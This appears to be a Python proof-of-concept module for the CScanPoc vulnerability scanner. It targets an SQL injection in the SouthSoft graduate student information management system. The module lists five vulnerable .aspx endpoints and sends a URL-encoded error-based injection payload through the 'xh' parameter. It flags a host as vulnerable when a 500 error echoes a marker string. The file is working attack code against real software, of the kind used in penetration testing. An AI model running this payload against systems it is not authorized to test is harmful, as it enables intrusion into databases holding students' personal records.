# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SouthSoft_0002'  # 平台漏洞编号，留空
    name = '南软研究生信息管理系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-04'  # 漏洞公布时间
    desc = '''
        南软公司分别在教育、政府机关、烟草、企业等多个领域展开了软件研发，电子商务应用及系统集成工作。
        南软研究生信息管理系统SQL注入漏洞：
        "/Gmis/xw/xskycgdj.aspx?xh=",
        "/Gmis/xw/xwsb_tdxlssEdit.aspx?xh=",
        "/Gmis/xw/xwsb_gdxxjsEdit.aspx?xh=",
        "/Gmis/xw/xwsb_tdxlbsEdit.aspx?xh=",
        "/Gmis/xw/xskycgdj.aspx?xh=",
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SouthSoft'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '914527f8-eb25-4298-8f9b-4474eb88bbd7'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/Gmis/xw/xskycgdj.aspx?xh=",
                "/Gmis/xw/xwsb_tdxlssEdit.aspx?xh=",
                "/Gmis/xw/xwsb_gdxxjsEdit.aspx?xh=",
                "/Gmis/xw/xwsb_tdxlbsEdit.aspx?xh=",
                "/Gmis/xw/xskycgdj.aspx?xh=",
            ]
            data = "%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
            for p in ps:
                url = arg+p+data
                code, head, res, errcode, _ = hh.http(url)

                if code == 500 and "testXQ17" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
